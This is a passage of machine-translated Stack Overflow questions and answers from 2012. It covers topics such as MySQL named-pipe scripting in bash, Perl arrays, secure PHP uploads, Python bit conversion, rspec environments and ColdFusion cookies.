   #the dash symbol '-' makes tabs at the beginning of line to be
   #ignored inside the here-doc but improves formation!
   mysql_client <<- QUERY
\! tee $TMPSQL
use test;
select * from customers;
\! echo '===3.CHILD=== End 1st query'
#####################################
#\. $TMPSCRIPT
#####################################
QUERY

   echo "===5.CHILD=== Executing 2nd query......writing to $TMPSQL"
   mysql_client <<- QUERY
\! tee $TMPSQL
use test;
select * from cars;
\! echo '===6.CHILD=== End 2nd query'
#####################################
#\. $TMPSCRIPT
#####################################
QUERY

   echo '===8.CHILD=== End of background jobs'
   echo > $TMPSQL
}

   #parse command line arguments
   parse_args

   #initialize variables
   init_vars

   #call dispatcher
   dispatcher 
```

假设您有一个“测试”数据库，那么您可以看到以下输出：

```
===1.PARENT=== Starting background jobs...
We can guarantee the succession only of 2->3,4 and 5->6,7 but NOT 3->4 or 6->7!
===2.CHILD=== Executing 1st query......writing to mysql-30627.1495.5394.7533
===4.PARENT=== ...1st query has been read
id_customer firstname   secondname
1   John    Pincolo
2   Mark    Denonto
3   Ann Curtis
4   Jeny    Wirth
===3.CHILD=== End 1st query
===5.CHILD=== Executing 2nd query......writing to mysql-30627.1495.5394.7533
===7.PARENT=== ...2nd query has been read
id_car  type    plate   date_rent   date_returned
1   fiat    BG-457  2012-07-18 00:00:00 2012-07-20 00:00:00
2   renault AS-1234 2012-07-20 00:00:00 2012-07-25 00:00:00
3   fiat    JYB-2856    2012-06-23 00:00:00 2012-06-24 00:00:00
===6.CHILD=== End 2nd query
===8.CHILD=== End of background jobs 
```

如您所见，我的第一个数据库结果集位于 2 到 5 之间！您想要查询和“主”程序之间的中间结果，并且您拥有它们！

您可能想知道：“嘿，我想获得一个数据库锁，在我的'主'程序执行其他操作时停止会话以冻结！” 嗯，也有答案。函数 'worker' 有 2 个注释命令：

```
#####################################
#\. $TMPSCRIPT
##################################### 
```

通过启用他们你的执行挂起！而已！现在，您可以开始在调度程序中执行操作，当您完成发送一个“回声”时，如下所示：

```
echo > $TMPSCRIPT 
```

通过将这行代码添加到我们的工作程序中，我们将调度程序和工作程序都转换为阻塞线程：现在两者都互相监听。示意图：

```
 dispatcher
     |         start
     A     ---------------->    worker
     |                            |
     B (read blocks)              C
     |                   signals  |
     B (unblocks)<--------------- D (write blocks)
     |                            |
     E (1st set of results)       F
     |                            |
     |                            G (read blocks)
     |  signals                   |
     H ---------------->          G (unblocks)
     | (write blocks)             | 
```

如果你需要更多的兴奋，发送什么

```
echo 'set @x=@x+1;' > $TMPSCRIPT 
```

其中“@x”是用户定义的变量！我们这里有什么？好吧，我们只是将实时代码“注入”到我们的 sql 作业中！非常棒！！！

现在，可以获取数据库的 LOCk，进行逻辑备份，停止并继续 mysql 客户端，并在数据库 LOCK 仍处于活动状态时为所欲为！

它可以更好：创建二进制备份怎么样？（每年只需为您节省 2,000-10,000 美元，请参阅：[https](https://shop.oracle.com) ://shop.oracle.com ）

总比更好：一堆说 10 个数据库可以被锁定并开始备份，第一个完成发送确认到调度程序，调度程序在列表中添加另一个数据库，直到它变空！只记得每个工人都需要两把锁来进行双向锁定。

我们甚至可以同时启动 3 个调度程序，因为它们在空间上是独一无二的，因此不可能面对它们的命名管道的冲突。

这是我的 2,000 美元建议

甜的！

（百人队）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:29:36.173

在同一连接中运行您的 SQL：

```
mysql="mysql -h dbhost -u user -pPassword diskcopydb"
echo "LOCK tables diskcopy WRITE;SELECT SQL_NO_CACHE * FROM diskcopy WHERE status=\"request\"" | $mysql 
```

否则，锁定是针对在您第二次运行 mysql 时已经失效的会话。

# ruby-on-rails - CanCan::Ability current_user 方法在哪里定义？

> ID：12461347
> 
> 赞同：0
> 
> 时间：2012-09-17T14:23:05.227
> 
> 标签：ruby-on-rails, ruby-on-rails-3, devise, cancan

和我在标题中提到的差不多。我在我的代码中使用 CanCan::Ability 来检查权限和能力。它期望定义一个 current_user 方法。我猜它来自设计（但不确定），我希望覆盖它。最好的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:47:20.040

它可以[在](https://github.com/ryanb/cancan/blob/master/lib/cancan/controller_additions.rb#L352)源代码中找到。不过，这与设计无关。文档位于方法上方并描述了覆盖它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T16:07:31.720

`current_user`由[这个 eval'ed 块中](https://github.com/plataformatec/devise/blob/master/lib/devise/controllers/helpers.rb#L55)的设计实现（我相信它是由`devise_for(:user)`你的 in间接调用的`config/routes.rb`）。如果你想覆盖它，你应该能够`current_user`在你的`ApplicationController`.

# arrays - 将计划创建为 2D 数组 perl

> ID：12461348
> 
> 赞同：1
> 
> 时间：2012-09-17T14:23:06.083
> 
> 标签：arrays, perl, multidimensional-array

我试图在 Perl 中初始化一个基本上是一个时间表的二维数组。所以它看起来像这样：

```
Time     Mon   Tue   Wed   Thu   Fri
09:00     0     0     0     0     0  
10:00     0     0     0     0     0 
11:00     0     0     0     0     0 
12:00     0     0     0     0     0 
13:00     0     0     0     0     0 
14:00     0     0     0     0     0 
15:00     0     0     0     0     0 
16:00     0     0     0     0     0
17:00     0     0     0     0     0 
18:00     0     0     0     0     0 
19:00     0     0     0     0     0 
20:00     0     0     0     0     0 
```

我在 Perl 中阅读了一些关于 2D 数组的文章，但我仍然感到困惑。最简单的方法是什么？请解释一下，以便我了解发生了什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:41:40.070

看看[`perllol`](http://perldoc.perl.org/perllol.html)。它是 Perl 中列表列表的最佳文档

本质上，Perl 数组的每个元素都可以是任何标量值——字符串或数字，或者更奇特的东西，例如子例程引用或文件句柄引用。要创建一个二维数组，您需要一个数组数组，因此基本数组的每个元素都需要是数组引用

该`[...]`构造创建一个匿名数组并返回对它的引用。*匿名*部分只是意味着它没有附加标识符，`@data`但它存在于内存中并且可以通过它的引用访问

例如，通过引用访问数组元素的语法是`$array_ref->[0]`针对第一个元素的。所以如果我写

```
my $array_ref = [ '09:00', 0, 0, 0, 0, 0 ];
print $array_ref->[0]; 
```

我会看到`09:00`输出

对于您的数据，您可以编写

```
my @data = (
  [ '09:00', 0, 0, 0, 0, 0 ],
  [ '10:00', 0, 0, 0, 0, 0 ],
  [ '11:00', 0, 0, 0, 0, 0 ],
  [ '12:00', 0, 0, 0, 0, 0 ],
  [ '13:00', 0, 0, 0, 0, 0 ],
  [ '14:00', 0, 0, 0, 0, 0 ],
  [ '15:00', 0, 0, 0, 0, 0 ],
  [ '16:00', 0, 0, 0, 0, 0 ],
  [ '17:00', 0, 0, 0, 0, 0 ],
  [ '18:00', 0, 0, 0, 0, 0 ],
  [ '19:00', 0, 0, 0, 0, 0 ],
  [ '20:00', 0, 0, 0, 0, 0 ],
); 
```

`$data[0]`对保存第一行数据的（匿名）数组的引用也是如此，并且`$data[0]->[0]`是`'09:00'`

此外，还有一个语法工具允许省略任何一对右括号和左括号之间的箭头，因此`$data[0]->[0]`可以写成`$data[0][0]`具有完全相同的含义

# php - 最新的安全 PHP 图片上传

> ID：12461352
> 
> 赞同：0
> 
> 时间：2012-09-17T14:23:11.583
> 
> 标签：php, security, file, uploading

我需要实现一个安全的 PHP 文件上传脚本。您当前使用哪些方法来确保您的脚本是安全的？

我会将允许的扩展列入白名单，并确保 Apache 以用户身份运行，以避免默认情况下需要 777 权限。

上传的文件将是图像，我有 MySQL 访问权限。上传后，用户需要能够看到他们的文件。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:40:55.977

有关避免上传恶意文件的一些建议，请参阅[如何阻止人们上传带有注射的 GIF？](https://stackoverflow.com/questions/10865202/ways-to-stop-people-from-uploading-gifs-with-injections-in-them).

另一个重要的事情是避免 SQL 注入。任何可以被攻击者修改的数据（cookies、用户代理、查询字符串、POST 数据（包括上传的文件名）、标题、动态路径名等）都不应在未通过`mysql_real_escape_string`或[MySQLi 等效](http://php.net/manual/en/mysqli.real-escape-string.php)项之前使用。如果是整数，请使用该`intval()`函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T20:25:28.947

按照您所说的检查文件扩展名，但要验证具有正确扩展名的上传文件实际上是它所说的内容，请尝试[使用 verify 命令通过 imagemagick 运行它](http://www.imagemagick.org/script/identify.php)。这是一个简单的解决方案，似乎是为数不多的方法之一，可以毫无疑问地保证图像与它声称的一样。

此外，使用 PHP 函数[is_uploaded_file](http://php.net/manual/en/function.is-uploaded-file.php)来增加额外的安全级别。

希望这是不言而喻的，但 PDO 应该用于 PHP 各个方面的数据库事务。

最后，请记住，如果您使用 javascript 进行任何验证，它很容易被半熟练的网络用户覆盖。客户端验证对用户的响应速度更快，但始终通过适当的服务器端检查来支持它。

# facebook - 在 Facebook 中设置我的国家和地区

> ID：12461359
> 
> 赞同：1
> 
> 时间：2012-09-17T14:23:38.347
> 
> 标签：facebook, locale, country, country-codes

我有一个 FB 应用程序，它使用国家和地区代码向用户显示替代内容。

有谁知道如何在 Facebook 中更改我的用户帐户的区域设置和国家/地区，以便测试系统返回的不同值？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-09T14:40:56.117

您还可以强制 Facebook 以特定语言打开页面或应用程序，方法是调用带有一些附加参数的 URL，如下所示： [https](https://apps.facebook.com/your-app-name/?locale=en_US) ://apps.facebook.com/your-app-name/?locale=en_US （英语） [https://apps.facebook.com/your-app-name/?locale=hu_HU](https://apps.facebook.com/your-app-name/?locale=hu_HU) （匈牙利语）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T15:04:41.647

主页 > 帐户设置 > 常规 > 语言附近的箭头

# python - Python中的位列表到整数

> ID：12461361
> 
> 赞同：28
> 
> 时间：2012-09-17T14:23:44.127
> 
> 标签：python, arrays, list, bit-manipulation

我在 Python 中有这样的列表：`[1,0,0,0,0,0,0,0]`. 我可以像输入 0b10000000 那样将其转换为整数（即​​转换为 128）吗？我还需要将序列转换`[1,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0]`为整数（这里它将返回 0b1100000010000000，即 259）。如果需要，列表的长度始终是 8 的倍数。

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2012-09-17T14:25:16.543

您可以使用位移：

```
out = 0
for bit in bitlist:
    out = (out << 1) | bit 
```

这很容易击败 ARS 提出的“int cast”方法，或 Steven Rumbalski 提出的带有查找的修改转换：

```
>>> def intcaststr(bitlist):
...     return int("".join(str(i) for i in bitlist), 2)
... 
>>> def intcastlookup(bitlist):
...     return int(''.join('01'[i] for i in bitlist), 2)
... 
>>> def shifting(bitlist):
...     out = 0
...     for bit in bitlist:
...         out = (out << 1) | bit
...     return out
... 
>>> timeit.timeit('convert([1,0,0,0,0,0,0,0])', 'from __main__ import intcaststr as convert', number=100000)
0.5659139156341553
>>> timeit.timeit('convert([1,0,0,0,0,0,0,0])', 'from __main__ import intcastlookup as convert', number=100000)
0.4642159938812256
>>> timeit.timeit('convert([1,0,0,0,0,0,0,0])', 'from __main__ import shifting as convert', number=100000)
0.1406559944152832 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-09-17T14:33:45.207

...或使用[位串](http://packages.python.org/bitstring/index.html#)模块

```
>>> from bitstring import BitArray
>>> bitlist=[1,0,0,0,0,0,0,0]
>>> b = BitArray(bitlist)
>>> b.uint
128 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-09-17T14:25:39.750

试试这个单行：

```
int("".join(str(i) for i in my_list), 2) 
```

如果您关心速度/效率，请查看 Martijn Pieters 的解决方案。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-09-17T21:18:24.627

我遇到了一种稍微优于 Martijn Pieters 解决方案的方法，尽管他的解决方案当然更漂亮。我实际上对结果有点惊讶，但无论如何......

```
import timeit

bit_list = [1,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0]

def mult_and_add(bit_list):
    output = 0
    for bit in bit_list:
        output = output * 2 + bit
    return output

def shifting(bitlist):
     out = 0
     for bit in bitlist:
         out = (out << 1) | bit
     return out

n = 1000000

t1 = timeit.timeit('convert(bit_list)', 'from __main__ import mult_and_add as convert, bit_list', number=n)
print "mult and add method time is : {} ".format(t1)
t2 = timeit.timeit('convert(bit_list)', 'from __main__ import shifting as convert, bit_list', number=n)
print "shifting method time is : {} ".format(t2) 
```

结果：

```
mult and add method time is : 1.69138722958 
shifting method time is : 1.94066818592 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2019-04-18T19:36:45.100

这个怎么样：

```
out = sum([b<<i for i, b in enumerate(my_list)]) 
```

或以相反的顺序：

```
out = sum([b<<i for i, b in enumerate(my_list[::-1])]) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-11-14T16:02:13.807

@Akavall 建议的最简单的方法是最快的方法。下面的 mult_add_xor 的附加时序表明，python 中的位操作较慢，因为简单的加法“+ bit”比 xor “| bit”快，并且乘以 2 比移位“<< 1”快。

```
import timeit

bit_list = [1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]

def mult_and_add(bit_list):
    output = 0
    for bit in bit_list:
        output = output * 2 + bit
    return output

def mult_and_xor(bit_list):
    output = 0
    for bit in bit_list:
        output = output * 2 | bit
    return output

def shifting(bitlist):
    out = 0
    for bit in bitlist:
        out = (out << 1) | bit
    return out

n = 1000000

a1 = mult_and_add(bit_list)
a2 = mult_and_xor(bit_list)
a3 = shifting(bit_list)

print('a1: ', a1, ' a2: ', a2, ' a3: ', a3)
assert a1 == a2 == a3

t = timeit.timeit('convert(bit_list)',
                  'from __main__ import mult_and_add as convert, bit_list',
                  number=n)
print("mult and add method time is : {} ".format(t))
t = timeit.timeit('convert(bit_list)',
                  'from __main__ import mult_and_xor as convert, bit_list',
                  number=n)
print("mult and xor method time is : {} ".format(t))
t = timeit.timeit('convert(bit_list)',
                  'from __main__ import shifting as convert, bit_list',
                  number=n)
print("shifting method time is : {} ".format(t)) 
```

输出：

```
a1:  49280  a2:  49280  a3:  49280
mult and add method time is : 0.9469406669959426 
mult and xor method time is : 1.0905388034880161 
shifting method time is : 1.2844801126047969 
```

# ruby-on-rails - 为什么我应该只在测试环境而不是开发或生产环境中在我的 Rails 应用程序上运行 rspec 规范？

> ID：12461368
> 
> 赞同：9
> 
> 时间：2012-09-17T14:23:56.527
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, testing, rspec

有人告诉我，除了测试之外，我不应该在 rails_env 中运行我的 rspec 规范。

在生产或开发中运行规范有哪些潜在问题？我在两者中都运行规范。我通常在 dev 中运行规范，除非我正在测试使用资产管道的东西。我为此切换到生产环境，并花费 15 分钟预编译资产。与我当前的方法相比，使用测试环境有什么优势吗？

我搜索了答案，但没有解释为什么我不应该使用 dev 或 prod。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-17T15:01:13.110

在环境中运行测试套件（例如*rspec*）`test`旨在隔离资源以解决安全问题，特别是数据库的完整性。测试通常会破坏或完全删除数据库中的数据。

对于所有资源也是如此。通过使用`test`环境，您可以切断和模拟资源，从而防止您的测试破坏任何东西。

使用分离环境的原因有很多，但从根本上说，它是一种资源分离，在`test`环境的上下文中，它是为了在确保生产资源和运行系统的安全性的同时启用应用程序的验证。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T14:43:41.960

让我们明确一点，尤其是对于可能正在阅读这篇文章的 nubes：（`RAILS_ENV=production`本地）**与**“在`production`环境中”运行测试不同。我知道你（OP）知道这一点，但是在生产环境中运行测试的危险需要这个警告。

仅在 env 中运行有几个原因`test`，通常与 DB 的处理有关：

*   Rspec 在数据库中构建数据的自定义“版本”，并在此基础上进行操作，将一些更改持久化回磁盘。
*   许多测试消除了现有数据，接近测试隔离并使事物具有幂等性。这可能会影响您在测试中使用的建筑物的数据。

其他原因与您已经推测的一致：

1.  您的 prod 环境不应包含用于测试的 gem。为什么？：
    *   测试 gem 添加更多可能需要 ot lod & run 的代码，*不必要地*，在 live 应用程序中
    *   与测试相关的 gem 可能会在您的生产应用程序中引入安全漏洞。
2.  某些资产在“编译”后可能无法正确测试。
3.  资产和其他部署管道预编译可以不同地处理/关闭/等，以服务于测试过程。
4.  某些 API 和服务可能在测试/登台中被*沙盒*化或存根，例如对按使用付费服务（如电子邮件或报告）的 API 调用。

可能性太定制（对您的应用程序）建议最佳实践......但是，不用说，有许多“测试模式”设置可能需要配置时`rails_ENV=test`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:55:20.093

你应该明确你的优先事项。为什么要运行规范？

1.  可以肯定的是，您的环境 xyz 完全运行您的代码，或者
2.  可以肯定的是，你的代码应该做的

我会说，大多数人都运行 2\. 的规范，这确实应该在测试环境中进行，只是出于 NewAlexandrias 回答中给出的原因。

当您想在部署后检查 1\. 时，运行规范对我来说似乎有点牵强。应该有更简单的方法。

当您部署时，您不确定 2\. ... 那是过早的部署，您不应该这样做。

# jquery - jquery json调用不起作用

> ID：12461371
> 
> 赞同：1
> 
> 时间：2012-09-17T14:24:06.427
> 
> 标签：jquery, ajax, json

我正在尝试使用以下方法从 json 文件创建一个数组：

```
<script type="text/javascript">
var stores = [];
$.getJSON('js/locations.json', function(data) {
    $.each(data, function(key, value) {
        stores.push("<option value="+key+">"+value+"</option>");  
    }); 
});
</script> 
```

但是当我调用它时，该数组似乎是空的。json 文件如下所示：

```
{
    '1' : 'Store 1',
    '2' : 'Store 2',
    '3' : 'Store 3'
} 
```

如果有人能告诉我为什么它不工作，那将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:36:45.013

也许json无效。尝试：

{“1”：“商店 1”，“2”：“商店 2”，“3”：“商店 3”}

单引号加倍。使用单引号 jsonlint.com 不验证....

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:29:41.430

1.  打印，whatserver 返回。类似于：console.debug(data);
2.  尝试其他 json 文件内容。例如这个：

    {“一”：“奇异感觉”，“二”：“珠光宝气的小眼睛”，“三”：“我家门口的小鸟”}

祝你好运 ;-）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:55:23.850

如果您尝试访问本地 json 文件的位置。webkit 浏览器不允许它。尝试使用`--allow-file-access-from-files`. IE 8+ 拒绝相同的访问。 `$.getJSON`在 Firefox 中给出读取本地文件的问题。可能的解决方案可以通过这个。

```
var req = new XMLHttpRequest();
req.open("GET", "a.json",false);
req.overrideMimeType("application/json");
req.send(null);
var myJson = req.responseText; 
```

或者您可以将 JSON 作为 var 放入您的 JS 文件中以进行测试。

# php - 在 PHP 中创建一个真正的灰度 PNG

> ID：12461373
> 
> 赞同：6
> 
> 时间：2012-09-17T14:24:07.930
> 
> 标签：php, png, rgb, grayscale, gdlib

我需要在 PHP 中创建灰度图像。我不是在谈论在其调色板中具有灰度值的索引图像，而是在谈论 TRUE 灰度图像。不同之处在于 PNG 的第 26 个字节（颜色类型）：

```
0 - greyscale  <-- THIS IS WHAT I NEED
2 - RGB
3 - RGB with palette
4 - greyscale + alpha
6 - RGB + alpha 
```

（有关详细信息，请参阅[如何检查 PNG 的灰度/alpha 颜色类型？](https://stackoverflow.com/questions/2057923/how-to-check-a-png-for-grayscale-alpha-color-type)）

我也试过`imagefilter($im, IMG_FILTER_GRAYSCALE);`了，`imagetruecolortopalette($im, false, 255);`但我得到的只是 RGB 灰度图像（颜色类型 2）或带有灰度调色板的 RGB 调色板图像（颜色类型 3）。我也尝试使用`imagecreate()`而不是初始化图像，`imagecreatetruecolor()`但这只会导致调色板图像。

有没有办法使用 PHP 的 GD 函数（或 PHP 中的任何其他函数）创建颜色类型 0 灰度 PNG？

这里有一些不同灰度图像的样本来说明我的意思。它们看起来都一样，但是如果您在 PhotoShop 中打开它们并查看图像 -> 模式设置，您会发现不同之处。此外，十六进制编辑器将显示第 26 个字节的差异：

![RGB](../Images/f6f39a27411f2d3f17e50d8cdfd3b986.png)RGB，**颜色类型**2，3149 字节
![RGB 调色板](../Images/11f5d5dfb554b6a503550c63b03037be.png)RGB 调色板，**颜色类型**3，3971 字节
![真灰度图像](../Images/552e01a3ad1c64ee75471303fcb76d89.png)真灰度图像，**颜色类型**0，1105 字节 <-- 这就是我需要的

**更新 01：**

这是我用来创建 PNG 的基本代码。注释行是我尝试过的替代方法：

```
//$im = imagecreate($image_size, $image_size);
$im = imagecreatetruecolor($image_size, $image_size);

//imagefilter($im, IMG_FILTER_GRAYSCALE);
//imagetruecolortopalette($im, false, 255);

imagepng($im, $imgPathName);
imagedestroy($im); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-17T18:03:21.780

GD 库不支持转换为“真实”灰度。它仅支持 RGB 和 TrueColor*。

> 有没有办法使用 PHP 的 GD 函数（或 PHP 中的任何其他函数）创建颜色类型 0 灰度 PNG？

[ImageMagick](http://php.net/manual/en/book.imagick.php)是您正在寻找的。

```
$im = new Imagick();
$im->readImage('file.png');
$im->setImageType(Imagick::IMGTYPE_GRAYSCALE);
$im->writeImage('file.gray.png'); 
```

# titanium - 将选项设置为选项对话框 Titanium

> ID：12461374
> 
> 赞同：0
> 
> 时间：2012-09-17T14:24:08.803
> 
> 标签：titanium, titanium-mobile, options

我从服务器得到一个 JSON 字符串：

```
genre [
 'type1',
 'type2',
 'type3',
 'type4' 
```

]

我想获取数组类型中的值以添加到 option_dialog 中的选项。我声明：

```
var genreArr=[];
for(var i=0;i<genre.length;i++) 
{
 genreArr.push(genre[i]));
} 
```

然后我创建选项对话框并为其设置选项。

```
var option_dialog=Ti.UI.createOptionDialog({});
option_dialog.options=genreArr; 
```

但是当单击选项对话框时，它不会在数组genreArr中显示值。你能帮帮我吗。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T16:49:52.757

`options`是一个 CREATION-ONLY 属性，如[文档](http://docs.appcelerator.com/titanium/2.1/index.html#!/api/Titanium.UI.OptionDialog-property-options)中所指定。您必须将它传递给您的 createOptionDialog 调用，如下所示。

```
var genre = [
    'type1',
    'type2',
    'type3',
    'type4'
];

var dialog = Ti.UI.createOptionDialog({
    options: genre,
    title: 'Pick a Genre'
});
dialog.addEventListener('click', function(evt)
{
    alert('You picked ' + genre[evt.index]);
});
dialog.show(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-23T05:46:03.060

您可以以我在代码中使用的这种方式使用

```
 var genre = [
    'type1',
    'type2',
    'type3',
    'type4'
]; 
```

// 在 onclick 监听器中调用选项对话框

```
var dialog = Ti.UI.createOptionDialog(genre).show(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-21T13:12:46.987

```
var win = Titanium.UI.createWindow({
    title:"Prompting the Device to Vibrate",
    backgroundColor:"#FFFFFF"
});

var label = Titanium.UI.createLabel({
    text:"Your choice will appear here",
    width:"auto",
    height:"auto"
});

//The option dialog is very similar to the alert dialog in its creation and handling
var colorDialog = Titanium.UI.createOptionDialog({
    title:"What color do you like?",
    options: ["Yellow","Surprise me","No thanks"],
    cancel:2//The index in the options array that defines which of the buttons is a cancel button
});

var optionButton = Titanium.UI.createButton({
    title:"Option Dialog!",
    height:48,
    width:120,
    bottom:12
});

colorDialog.addEventListener("click",function(e){
    if(e.index < 2){
        if(e.index === 0){
            win.backgroundColor = "#FFCC00";
        }else if(e.index === 1){
            win.backgroundColor = "#329FF0";
        }

    //Access the button index via e.index
    //Use that index with e.source.buttonNames to return th button name tapped: e.source.buttonNames[e.index]
    label.text = "You tapped index " + e.index;

    }else{
        label.text = "Aww shucks...";
    }

});

optionButton.addEventListener("click",function(e){
    colorDialog.show();
});

win.add(label);
win.add(optionButton);
win.open(); 
```

# php - mysql_connect 和 mysql_select_db 不能在代码中分开？

> ID：12461376
> 
> 赞同：0
> 
> 时间：2012-09-17T14:24:13.243
> 
> 标签：php, mysql, mysql-connect, mysql-select-db

我不确定问题是什么，我有一个名为 dbs.inc.php 的文件，其中包含用户/密码/数据库变量和 mysql_connect(); 陈述。如果我包含（“dbs.inc.php”）；在一个函数中，它下面的下一行总是必须是 mysql_select_db($database); 这正常吗？在函数结束之前不应该可以访问包含的变量吗？为什么在连接/选择语句之间添加几行额外的代码会阻止选择工作？

再次：

```
include("dbs.inc.php");
mysql_select_db($database); 
```

作品。如果我这样做：

```
include("dbs.inc.php");
$a = "123456";
mysql_select_db($database); 
```

mysql_select_db($database) 将无法选择数据库？

# c# - 你如何在 Jquery 中触发 iwc:ImageButton 的点击事件？

> ID：12461380
> 
> 赞同：0
> 
> 时间：2012-09-17T14:24:32.077
> 
> 标签：c#, jquery, asp.net, user-controls

我的页面上有一个控件，其语法为：

```
 <iwc:ImgButton runat="server" ID="saveForm" ImageUrl="~/images/save.png" OnClientClick="saveFormData(); return false;" Text="Save Form" /> 
```

其中包含一些要触发的脚本。我打算有一个带有确认框的计时器，它会提醒人们保存。“已经 X 分钟了。要保存吗？”

当他们说好的时，它会触发这个命令：

```
 $("#saveForm").click(); 
```

但它似乎并没有触发点击功能。为什么不？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:24:32.077

ID 是服务器上的 ID，而不是客户端的答案。要修复它，jquery 命令应该是：

```
 $("#<%= saveForm.ClientID %>").click(); 
```

那将解决它。确认的。

# cookies - 如何在 Coldfusion 中检索名称通过变量设置的 cookie？

> ID：12461385
> 
> 赞同：3
> 
> 时间：2012-09-17T14:24:38.970
> 
> 标签：cookies, coldfusion

> **可能重复：**
> [调用名称中带有变量的变量-coldfusion？](https://stackoverflow.com/questions/12425794/calling-a-variable-with-a-variable-in-its-name-coldfusion)

抱歉，我是 Coldfusion 的新手。试图在工作中更新一些遗留代码......

我使用变量在coldfusion 中命名了一个cookie。

```
<cfcookie name="#FORM.cookie_name#" Expires="#FORM.cookie_expires#"> 
```

如何检查 cookie 是否未过期？这似乎使页面崩溃...

```
<cfif isDefined("cookie.#FORM.cookie_name#")> 
```

非常感谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-17T14:49:36.553

要检查它是否存在，请使用[StructKeyExists](http://cfdocs.org/StructKeyExists)：

```
StructKeyExists(Cookie,Form.cookie_name) 
```

要使用变量，请使用括号表示法：

```
Cookie[Form.cookie_name] 
```

**不要忘记**表单变量和 Cookie 变量都是由用户/客户端提交的——因此必须得到适当的处理（即永远不要相信它们包含您认为它们所做的事情，因为不能保证）。

* * *

请注意，如果您确实想使用[isDefined](http://cfdocs.org)表单来执行此操作（尽管这样做有好处），则需要这样编写：

```
isDefined("Cookie['#Form.cookie_name#']") 
```

然后将其评估为`Cookie['606ac80d']`- 如果没有这些单引号，它将是一个无效变量。

正如 Leigh 所指出的，上述内容在 Railo 和 OpenBD 中有效，但在 Adob​​e ColdFusion 中无效，您需要在其中编写：

```
isDefined("Cookie.#Form.cookie_name#") 
```

此语法适用于简单的字母数字变量名称，但如果 form.cookie_name 包含带有`.`in 的值，则特别可能会导致问题。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-17T14:54:47.050

希望这可以帮助 ：）

```
<cfcookie name="#form.cookie_name#" Expires="#form.cookie_expires#">
<cfif structKeyExists(cookie, form.cookie_name)>
Cookie
</cfif> 
```

[与此帖子](https://stackoverflow.com/questions/12425794/calling-a-variable-with-a-variable-in-its-name-coldfusion/12426379#12426379)类似的问题

# ios - Parse.com 和 Facebook SDK 问题

> ID：12461392
> 
> 赞同：0
> 
> 时间：2012-09-17T14:24:55.723
> 
> 标签：ios, facebook, parse-platform

我正在尝试使用 Parse 的 Facebook SDK 版本，但由于某种原因，除了`PF_FBRequest`. 例如，`PF_FBRequestConnection`没有出现在 XCode 的自动完成中。我可以`PF_FBRequestConnection.h`在 Parse 的头文件中看到，所以我不确定它为什么不起作用。

我已经`#import "Parse/Parse.h"`包含在文件的顶部...我应该导入不同的文件来访问 Parse 的 Facebook SDK 版本吗？

到目前为止，我已经能够使用 Parse SDK 通过 Facebook 登录，所以我认为我已经正确安装了它......

**更多信息**

在 Xcode 的自动完成中，只有 PF_Facebook、PF_FBDialog、PF_FBFrictionlessRequestSettings、PF_FBLoginDialog、PF_FBRequest 和 PF_RequestState 对象可用...我觉得需要导入另一个文件或其他东西，这就是为什么其他对象/方法没有出现...

或者，当我使用 Parse 通过 Facebook 登录时，如何将股票 Facebook SDK 与 Parse 一起使用？如何从`handleOpenUrl`股票 FB SDK 获取活动会话？

**另一个更新**

请参阅下面的评论 - 该问题似乎与将 Parse 框架导入现有项目有关。除了 Parse 快速入门指南中的内容之外，您是否应该做任何额外的事情来让 FB SDK 工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T00:48:52.847

看起来我们在主标题中缺少更广泛的 FB API。您可以通过以下方式手动将它们添加到您的项目中：

```
#import "Parse/PF_FacebookSDK.h" 
```

这应该允许您自己使用它们，直到我们在 SDK 中更新它。

带来不便敬请谅解！

# iphone - iPhone CGContextDrawImage 和 UIImageJPEGRepresentation 大大降低了应用程序的速度

> ID：12461395
> 
> 赞同：0
> 
> 时间：2012-09-17T14:25:02.183
> 
> 标签：iphone, objective-c, xcode4.2, cordova

我有一个使用相机拍摄图像的应用程序。应用程序可以工作，但速度很慢，处理图像需要大约 10 秒。

我的意思是，旋转、创建缩略图并将它们都保存到闪存中。

应用程序基于 Cordova，但我没有参与其中。这是在旧型号 iPhone 3G 上运行的，但在新型号上尝试这个应用程序并没有产生更好的结果。

主要瓶颈是前面提到的 CGContextDrawImage 和 UIImageJPEGRepresentation 函数。

我不能将该代码分离到第二个线程中，因为结果必须尽快可见。

我搜索了两天，没有找到适用的解决方案。

我还发现了苹果的私有 API，但我不能使用它们。

这是时间关键代码的代码示例，如果您对如何加快速度有任何建议，那就太好了。

```
